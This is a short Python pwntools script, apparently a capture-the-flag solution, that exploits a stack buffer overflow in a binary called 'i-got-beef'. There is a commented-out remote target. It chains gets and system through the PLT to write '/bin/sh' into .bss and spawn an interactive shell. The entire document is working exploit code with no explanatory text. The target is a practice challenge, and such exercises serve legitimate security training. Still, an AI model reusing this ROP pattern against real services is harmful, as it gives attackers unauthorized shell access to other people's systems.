from pwn import *
p = process('./i-got-beef')
#p = remote('hack.bckdr.in', 8015)
elf = ELF('./i-got-beef')

# gdb.attach(p,'''
# break *0x0804852d
# break *0x08048542
# ''')

offset = 13       

system_addr = elf.symbols['system']
gets_plt = elf.plt['gets']
#main = elf.symbols['main']
bss = elf.bss()
pr = 0x08048399

payload = ""
payload += "A"*offset
payload += p32(gets_plt)
payload += p32(pr)
payload += p32(bss)
payload += p32(system_addr)
payload += p32(pr)
payload += p32(bss)

p.sendline(payload)
p.sendline("/bin/sh\x00")
p.recv(1024)
p.interactive()